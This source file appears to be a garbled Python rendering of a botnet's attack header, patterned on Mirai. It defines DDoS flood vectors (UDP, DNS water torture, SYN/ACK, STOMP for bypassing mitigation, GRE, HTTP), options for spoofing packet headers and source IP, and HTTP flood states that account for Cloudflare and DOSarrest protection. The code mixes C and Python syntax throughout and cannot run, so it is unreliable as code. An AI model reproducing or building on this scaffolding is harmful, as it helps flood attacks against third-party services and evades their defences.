#pragma once

import time
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

ATTACK_CONCURRENT_MAX	= 8

#ifdef DEBUG
HTTP_CONNECTION_MAX	= 1000
#else
HTTP_CONNECTION_MAX	= 256
#endif

class attack_target(object):
    def __init__(self, sock_addr, addr):
        self.sock_addr = sock_addr
        self.addr = addr
    def sockaddr_in(sock_addr):
        return
    def ipv4_t(addr):
        return
# struct attack_target {
#     struct sockaddr_in sock_addr
#     ipv4_t addr
#
# struct attack_option {
class attack_option(object):
    def __init__(self, int, attack_target, ATK_VEC_UDP,ATK_VEC_VSE,ATK_VEC_DNS,ATK_VEC_SYN,ATK_VEC_ACK,ATK_VEC_STOMP,ATK_VEC_GREIP,ATK_VEC_GREETH,ATK_VEC_UDP_PLAIN,ATK_VEC_HTTP,ATK_OPT_PAYLOAD_SIZE,ATK_OPT_PAYLOAD_RAND,ATK_OPT_IP_TOS,ATK_OPT_IP_IDENT,ATK_OPT_IP_TTL,ATK_OPT_IP_DF,ATK_OPT_SPORT,ATK_OPT_DPORT,ATK_OPT_DOMAIN,ATK_OPT_DNS_HDR_ID,ATK_OPT_URG,ATK_OPT_ACK,ATK_OPT_PSH,ATK_OPT_RST,ATK_OPT_SYN,ATK_OPT_FIN,ATK_OPT_SEQRND,ATK_OPT_ACKRND,ATK_OPT_GRE_CONSTIP,ATK_OPT_METHOD,ATK_OPT_POST_DATA,ATK_OPT_PATH,ATK_OPT_HTTPS,ATK_OPT_CONNS,ATK_OPT_SOURCE):
        self.int = int
        self.attack_target = attack_target
        self.ATK_VEC_UDP = ATK_VEC_UDP
        self.ATK_VEC_VSE = ATK_VEC_VSE
        self.ATK_VEC_DNS = ATK_VEC_DNS
        self.ATK_VEC_SYN = ATK_VEC_SYN
        self.ATK_VEC_ACK = ATK_VEC_ACK
        self.ATK_VEC_STOMP = ATK_VEC_STOMP
        self.ATK_VEC_GREIP = ATK_VEC_GREIP
        self.ATK_VEC_GREETH = ATK_VEC_GREETH
        self.ATK_VEC_UDP_PLAIN = ATK_VEC_UDP_PLAIN
        self.ATK_VEC_HTTP = ATK_VEC_HTTP
        self.ATK_OPT_PAYLOAD_SIZE = ATK_OPT_PAYLOAD_SIZE
        self.ATK_OPT_PAYLOAD_RAND = ATK_OPT_PAYLOAD_RAND
        self.ATK_OPT_IP_TOS = ATK_OPT_IP_TOS
        self.ATK_OPT_IP_IDENT = ATK_OPT_IP_IDENT
        self.ATK_OPT_IP_TTL = ATK_OPT_IP_TTL
        self.ATK_OPT_IP_DF = ATK_OPT_IP_DF
        self.ATK_OPT_SPORT = ATK_OPT_SPORT
        self.ATK_OPT_DPORT = ATK_OPT_DPORT
        self.ATK_OPT_DOMAIN = ATK_OPT_DOMAIN
        self.ATK_OPT_DNS_HDR_ID = ATK_OPT_DNS_HDR_ID
        self.ATK_OPT_URG = ATK_OPT_URG
        self.ATK_OPT_ACK = ATK_OPT_ACK
        self.ATK_OPT_PSH = ATK_OPT_PSH
        self.ATK_OPT_RST = ATK_OPT_RST
        self.ATK_OPT_SYN = ATK_OPT_SYN
        self.ATK_OPT_FIN = ATK_OPT_FIN
        self.ATK_OPT_SEQRND = ATK_OPT_SEQRND
        self.ATK_OPT_ACKRND = ATK_OPT_ACKRND
        self.ATK_OPT_GRE_CONSTIP = ATK_OPT_GRE_CONSTIP
        self.ATK_OPT_METHOD = ATK_OPT_METHOD
        self.ATK_OPT_POST_DATA = ATK_OPT_POST_DATA
        self.ATK_OPT_PATH = ATK_OPT_PATH
        self.ATK_OPT_HTTPS = ATK_OPT_HTTPS
        self.ATK_OPT_CONNS = ATK_OPT_CONNS
        self.ATK_OPT_SOURCE = ATK_OPT_SOURCE

class attack_method(object):
    def __init__(int, attack_target):
        self.int = int
        self.attack_target = attack_target

    def ATTACK_FUNC(func):
        return
    def ATTACK_VECTOR(vector):
        return
# typedef (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *)
# typedef ATTACK_VECTOR

ATK_VEC_UDP	= 0  # Straight up UDP flood
ATK_VEC_VSE	= 1  # Valve Source Engine query flood
ATK_VEC_DNS	= 2  # DNS water torture
ATK_VEC_SYN	= 3  # SYN flood with options
ATK_VEC_ACK	= 4  # ACK flood
ATK_VEC_STOMP	= 5  # ACK flood to bypass mitigation devices
ATK_VEC_GREIP	= 6  # GRE IP flood
ATK_VEC_GREETH	= 7  # GRE Ethernet flood
##define ATK_VEC_PROXY      8  /* Proxy knockback connection */
ATK_VEC_UDP_PLAIN	= 9  # Plain UDP flood optimized for speed
ATK_VEC_HTTP	= 10 # HTTP layer 7 flood

ATK_OPT_PAYLOAD_SIZE	= 0   # What should the size of the packet data be?
ATK_OPT_PAYLOAD_RAND	= 1   # Should we randomize the packet data contents?
ATK_OPT_IP_TOS	= 2   # tos field in IP header
ATK_OPT_IP_IDENT	= 3   # ident field in IP header
ATK_OPT_IP_TTL	= 4   # ttl field in IP header
ATK_OPT_IP_DF	= 5   # Dont-Fragment bit set
ATK_OPT_SPORT	= 6   # Should we force a source port? (0 = random)
ATK_OPT_DPORT	= 7   # Should we force a dest port? (0 = random)
ATK_OPT_DOMAIN	= 8   # Domain name for DNS attack
ATK_OPT_DNS_HDR_ID	= 9   # Domain name header ID
##define ATK_OPT_TCPCC           10  // TCP congestion control
ATK_OPT_URG	= 11  # TCP URG header flag
ATK_OPT_ACK	= 12  # TCP ACK header flag
ATK_OPT_PSH	= 13  # TCP PSH header flag
ATK_OPT_RST	= 14  # TCP RST header flag
ATK_OPT_SYN	= 15  # TCP SYN header flag
ATK_OPT_FIN	= 16  # TCP FIN header flag
ATK_OPT_SEQRND	= 17  # Should we force the sequence number? (TCP only)
ATK_OPT_ACKRND	= 18  # Should we force the ack number? (TCP only)
ATK_OPT_GRE_CONSTIP	= 19  # Should the encapsulated destination address be the same as the target?
ATK_OPT_METHOD	= 20	# Method for HTTP flood
ATK_OPT_POST_DATA	= 21	# Any data to be posted with HTTP flood
ATK_OPT_PATH	= 22  # The path for the HTTP flood
ATK_OPT_HTTPS	= 23  # Is this URL SSL/HTTPS?
ATK_OPT_CONNS	= 24  # Number of sockets to use
ATK_OPT_SOURCE	= 25  # Source IP

# struct attack_method {
#     ATTACK_FUNC func
#     ATTACK_VECTOR vector

class attack_stomp_data(object):
    def __init__(self, addr, sport, dport):
        self.addr = addr
        self.sport = sport
        self.dport = dport

    def ipv4_t(addr):
        return

    def port_t(sport,dport):
        return
# struct attack_stomp_data {
#     ipv4_t addr
#     port_t sport, dport

HTTP_CONN_INIT	= 0 # Inital state
HTTP_CONN_RESTART	= 1 # Scheduled to restart connection next spin
HTTP_CONN_CONNECTING	= 2 # Waiting for it to connect
HTTP_CONN_HTTPS_STUFF	= 3 # Handle any needed HTTPS stuff such as negotiation
HTTP_CONN_SEND	= 4 # Sending HTTP request
HTTP_CONN_SEND_HEADERS	= 5 # Send HTTP headers
HTTP_CONN_RECV_HEADER	= 6 # Get HTTP headers and check for things like location or cookies etc
HTTP_CONN_RECV_BODY	= 7 # Get HTTP body and check for cf iaua mode
HTTP_CONN_SEND_JUNK	= 8 # Send as much data as possible
HTTP_CONN_SNDBUF_WAIT	= 9 # Wait for socket to be available to be written to
HTTP_CONN_QUEUE_RESTART	= 10 # restart the connection/send new request BUT FIRST read any other available data.
HTTP_CONN_CLOSED	= 11 # Close connection and move on

HTTP_RDBUF_SIZE	= 1024
HTTP_HACK_DRAIN	= 64
HTTP_PATH_MAX	= 256
HTTP_DOMAIN_MAX	= 128
HTTP_COOKIE_MAX	= 5   # no more then 5 tracked cookies
HTTP_COOKIE_LEN_MAX	= 128 # max cookie len
HTTP_POST_MAX	= 512 # max post data len

HTTP_PROT_DOSARREST	= 1 # Server: DOSarrest
HTTP_PROT_CLOUDFLARE	= 2 # Server: cloudflare-nginx

class attack_http_state(object):
    def __init__(self, dst_addr):
        self.dst_addr = dst_addr
        self.HTTP_CONN_INIT = HTTP_CONN_INIT
        self.HTTP_CONN_RESTART = HTTP_CONN_RESTART
        self.HTTP_CONN_CONNECTING = HTTP_CONN_CONNECTING
        self.HTTP_CONN_HTTPS_STUFF = HTTP_CONN_HTTPS_STUFF
        self.HTTP_CONN_SEND = HTTP_CONN_SEND
        self.HTTP_CONN_SEND_HEADERS = HTTP_CONN_SEND_HEADERS
        self.HTTP_CONN_RECV_HEADER = HTTP_CONN_RECV_HEADER
        self.HTTP_CONN_RECV_BODY = HTTP_CONN_RECV_BODY
        self.HTTP_CONN_SEND_JUNK = HTTP_CONN_SEND_JUNK
        self.HTTP_CONN_SNDBUF_WAIT = HTTP_CONN_SNDBUF_WAIT
        self.HTTP_CONN_QUEUE_RESTART = HTTP_CONN_QUEUE_RESTART
        self.HTTP_CONN_CLOSED = HTTP_CONN_CLOSED
        self.HTTP_RDBUF_SIZE = HTTP_RDBUF_SIZE
        self.HTTP_HACK_DRAIN = HTTP_HACK_DRAIN
        self.HTTP_PATH_MAX = HTTP_PATH_MAX
        self.HTTP_DOMAIN_MAX = HTTP_DOMAIN_MAX
        self.HTTP_COOKIE_MAX = HTTP_COOKIE_MAX
        self.HTTP_COOKIE_LEN_MAX = HTTP_COOKIE_LEN_MAX
        self.HTTP_POST_MAX = HTTP_POST_MAX
        self.HTTP_PROT_DOSARREST = HTTP_PROT_DOSARREST
        self.HTTP_PROT_CLOUDFLARE = HTTP_PROT_CLOUDFLARE

    def ipv4_t(dst_addr):
        return
# struct attack_http_state {
#     ipv4_t dst_addr



class attack_cfnull_state(object):
    def __init__(self, dst_addr):
        self.dst_addr = dst_addr
    def ipv4_t(dst_addr):
        return
#
# struct attack_cfnull_state {
#     ipv4_t dst_addr

attack_init = True
# BOOL attack_init(void)

# Actual attacks



def add_attack(attack_method.ATTACK_VECTOR, vector, ATTACK_FUNC(func)):
    # struct attack_method *method = calloc(1, sizeof (struct attack_method))
    method = calloc(1, sizeof(attack_method))
    attack_method(method)
    method.vector = vector
    method.func = func

    methods = realloc(methods, (methods_len + 1) * sizeof (attack_method))
    methods[methods_len++] = method

#def free_opts(struct attack_option *opts, len):
def free_opts(attack_option(opts, len)):

    if opts == NULL:
        return

    for i in range(len):
        if opts[i].val != NULL:
            free(opts[i].val)
    free(opts)
